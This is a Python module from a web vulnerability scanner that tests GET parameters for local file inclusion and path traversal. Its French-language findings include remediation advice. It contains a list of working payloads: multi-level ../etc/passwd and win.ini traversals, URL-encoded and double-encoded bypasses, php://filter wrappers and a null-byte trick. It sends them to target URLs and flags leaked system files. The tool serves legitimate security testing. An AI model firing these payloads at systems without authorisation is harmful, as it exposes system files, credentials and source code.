"""
LFI / Path Traversal detection module.

Detects Local File Inclusion via GET parameters:
  - Linux path traversal (/etc/passwd)
  - Windows path traversal (win.ini)
  - PHP wrapper abuse (php://filter)
  - URL-encoded and double-encoded bypasses
"""
import re
from typing import Any, Dict, List
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from backend.scanner.modules.base_module import BaseModule

_LINUX_PASSWD = re.compile(r'root:[x*]:0:0:')
_WIN_INI      = re.compile(r'\[fonts\]|\[extensions\]|for 16-bit app support', re.IGNORECASE)
_PHP_B64      = re.compile(r'[A-Za-z0-9+/]{50,}={0,2}')

_PAYLOADS = [
    ("../../../etc/passwd",                         "3-level traversal"),
    ("../../../../etc/passwd",                      "4-level traversal"),
    ("../../../../../etc/passwd",                   "5-level traversal"),
    ("../../../../../../etc/passwd",                "6-level traversal"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd",             "URL-encoded 3-level"),
    ("..%2f..%2f..%2fetc%2fpasswd",                 "Partial URL-encoded"),
    ("..%252f..%252f..%252fetc%252fpasswd",         "Double URL-encoded"),
    ("../../../windows/win.ini",                    "Windows 3-level"),
    ("../../../../windows/win.ini",                 "Windows 4-level"),
    ("php://filter/convert.base64-encode/resource=index.php", "PHP base64 wrapper"),
    ("php://filter/read=string.rot13/resource=index.php",     "PHP rot13 wrapper"),
    ("../../../etc/passwd%00",                      "Null byte bypass"),
]


class LFIModule(BaseModule):
    NAME     = "lfi"
    CATEGORY = "LFI / Path Traversal"

    async def scan(self, url: str) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        parsed = urlparse(url)
        params = parse_qsl(parsed.query, keep_blank_values=True)

        if not params:
            return findings

        for idx, (pname, _) in enumerate(params):
            for payload, label in _PAYLOADS:
                probe_params = list(params)
                probe_params[idx] = (pname, payload)
                probe_url = urlunparse(parsed._replace(query=urlencode(probe_params)))
                try:
                    resp = await self._client.get(probe_url)
                    body = resp.text[:8000]

                    if _LINUX_PASSWD.search(body):
                        pos = body.find("root:")
                        evidence = body[max(0, pos):pos + 300]
                        findings.append(self._finding(
                            name="lfi_linux_passwd",
                            severity="critical",
                            confidence="confirmed",
                            description=f"LFI confirmé — paramètre «{pname}» → /etc/passwd lisible ({label})",
                            url=url,
                            location=probe_url,
                            evidence=evidence[:300],
                            impact=(
                                "Lecture arbitraire de fichiers système. Exposition des comptes "
                                "système, services actifs, et potentiellement des clés privées."
                            ),
                            recommendation=(
                                "Ne jamais utiliser des entrées utilisateur dans include/require/fopen. "
                                "Implémenter une whitelist stricte des fichiers autorisés."
                            ),
                        ))
                        break

                    elif _WIN_INI.search(body):
                        findings.append(self._finding(
                            name="lfi_windows_ini",
                            severity="critical",
                            confidence="confirmed",
                            description=f"LFI Windows confirmé — paramètre «{pname}» → win.ini lisible ({label})",
                            url=url,
                            location=probe_url,
                            evidence=body[:200],
                            impact="Lecture arbitraire de fichiers système Windows.",
                            recommendation=(
                                "Valider et filtrer tous les chemins de fichiers. "
                                "Utiliser une whitelist de fichiers autorisés."
                            ),
                        ))
                        break

                    elif "php://filter" in payload and resp.status_code == 200:
                        content = body.strip()
                        if content and _PHP_B64.search(content):
                            findings.append(self._finding(
                                name="lfi_php_filter",
                                severity="critical",
                                confidence="high",
                                description=f"PHP Wrapper LFI — paramètre «{pname}» → code source PHP lisible",
                                url=url,
                                location=probe_url,
                                evidence="Contenu base64 PHP détecté (php://filter/convert.base64-encode)",
                                impact=(
                                    "Lecture du code source PHP via php://filter — révèle credentials, "
                                    "logique interne, clés API et secrets."
                                ),
                                recommendation=(
                                    "Désactiver allow_url_include. "
                                    "Bloquer les wrappers PHP (php://, data://, expect://) en entrée."
                                ),
                            ))
                            break
                except Exception:
                    pass

        return self._dedup(findings)
